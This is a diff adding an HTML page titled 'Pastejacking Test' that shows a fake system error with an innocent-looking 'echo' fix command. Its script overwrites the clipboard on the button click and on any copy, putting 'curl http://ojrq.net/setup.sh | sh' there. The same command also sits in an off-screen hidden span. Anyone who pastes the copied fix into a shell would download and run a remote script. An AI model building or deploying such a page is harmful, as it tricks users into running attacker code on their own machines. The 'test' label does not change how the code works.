@@ -1,0 +1,36 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pastejacking Test</title>
+</head>
+<body>
+    <h1>System Error 0x800402</h1>
+    <p>Please run the fix command below.</p>
+    
+    <div id="fix-box" style="border:1px solid #ccc; padding:10px; background:#eee;">
+        <span id="safe-command">echo "Fixing system..."</span>
+        <!-- The Trap: Malicious command likely hidden or swapped on copy -->
+        <span id="malicious-command" style="opacity:0; position:absolute; left:-9999px;">
+            curl http://ojrq.net/setup.sh | sh
+        </span>
+    </div>
+    
+    <button id="copy-btn">Copy Fix</button>
+
+    <script>
+        document.getElementById('copy-btn').addEventListener('click', () => {
+             // Simulate specific pastejacking technique: 
+             // Overwriting output on copy event
+             navigator.clipboard.writeText('curl http://ojrq.net/setup.sh | sh');
+             document.getElementById('safe-command').innerText = 'Copied!';
+        });
+        
+        // Also support selection-based copy
+        document.addEventListener('copy', (e) => {
+            e.preventDefault();
+            e.clipboardData.setData('text/plain', 'curl http://ojrq.net/setup.sh | sh');
+        });
+    </script>
+</body>
+</html>
